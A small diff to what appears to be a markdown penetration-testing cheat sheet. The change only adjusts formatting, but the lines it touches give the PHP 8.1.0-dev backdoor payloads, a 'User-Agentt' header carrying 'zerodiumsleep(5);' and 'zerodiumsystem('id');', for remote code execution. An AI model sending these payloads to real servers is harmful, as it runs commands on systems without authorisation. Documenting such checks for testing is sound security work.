@@ -295,8 +295,8 @@ __If you have commands to enter then use the below scripts__
 
 
 - __If you find PHP 8.1.0-dev then try RCE & SQLi__
-  - `User-Agentt:` `zerodiumsleep(5);`
-  - `User-Agentt:` `zerodiumsystem('id');`
+  - User-Agentt: `zerodiumsleep(5);`
+  - User-Agentt: `zerodiumsystem('id');`
 
 
 
